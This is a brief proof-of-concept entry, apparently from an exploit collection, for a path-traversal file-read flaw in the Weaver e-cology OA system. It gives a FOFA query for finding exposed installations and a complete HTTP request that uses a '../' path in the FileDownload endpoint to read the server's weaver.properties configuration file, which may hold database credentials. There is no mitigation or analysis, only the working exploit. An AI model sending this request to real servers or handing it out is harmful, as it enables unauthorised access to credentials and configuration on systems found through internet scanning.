## 泛微OA-E-Cology-FileDownload文件读取漏洞


## fofa
```
app="泛微-OA（e-cology）"
```

## poc
```
GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
